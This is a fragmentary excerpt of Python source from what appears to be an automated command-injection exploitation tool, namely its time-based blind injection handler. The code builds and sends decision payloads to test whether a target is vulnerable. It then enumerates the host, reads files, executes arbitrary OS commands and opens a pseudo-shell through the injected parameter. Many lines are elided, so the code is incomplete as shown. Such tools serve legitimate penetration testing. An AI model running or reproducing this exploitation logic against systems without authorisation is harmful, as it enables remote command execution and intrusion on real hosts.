                        ...
                        for output_length in range(1, int(tag_length)):
                            try:
                                if alter_shell:
                                    ...
                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec,
                                                                               http_request_method)
                                else:
                                    # Time-based decision payload (check if host is vulnerable).
                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec,
                                                                   http_request_method)
                                ...
                                # Custom HTTP header Injection
                                    ...
                                    how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method,
                                                                                          url)
                                ...
                                if percent == 100 and no_result == True:
                                    ...
                                    if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                                        ...
                                        if false_positive_fixation:
                                            ...
                                            how_long, output = tb_injector.false_positive_check(separator, TAG, cmd,
                                                                                                whitespace, prefix,
                                                                                                suffix, timesec,
                                                                                                http_request_method,
                                                                                                url, vuln_parameter,
                    ...
                    if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                        ...
                        if (len(TAG) == output_length) and \
                            ...
                            if settings.ENUMERATION_DONE == True:
                                while True:
                                    ...
                                    if enumerate_again in settings.CHOICE_YES:
                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace,
                            ...
                            if settings.FILE_ACCESS_DONE == True:
                                ...
                                while True:
                                    ...
                                    if file_access_again in settings.CHOICE_YES:
                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace,
                                                                timesec, http_request_method, url, vuln_parameter,
                                                                alter_shell, filename, url_time_response)
                                        break
                            ...
                            if menu.options.os_cmd:
                                ...
                                check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd,
                                        ...
                                        try:
                                            ...
                                            if cmd.lower() in settings.SHELL_OPTIONS:
                                                ...
                                                if menu.options.ignore_session or \
                                                        session_handler.export_stored_cmd(url, cmd,
                                                                                          vuln_parameter) == None:
                                                    # The main command injection exploitation.
                                                    check_how_long, output = tb_injector.injection(separator, maxlen,
                                                                                                   TAG, cmd, prefix,
                                                                                                   suffix, whitespace,
                                                                                                   timesec,
                                                                                                   http_request_method,
                                                                                                   ...
                                                                                                   url_time_response)
                                                    # Export injection result
                                                    tb_injector.export_injection_results(cmd, separator, output,
                                                                                         check_how_long)
...
def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):
    ...
    if url_time_response >= settings.SLOW_TARGET_RESPONSE:
        ...
        while True:
            ...
            if proceed_option.lower() in settings.CHOICE_PROCEED:
                if proceed_option.lower() == "s":
                    ...
                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response,
                                            injection_type, technique) == False:
                        return False
                elif proceed_option.lower() == "q":
                    raise SystemExit()
            else:
        ...
        if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type,
                                technique) == False:
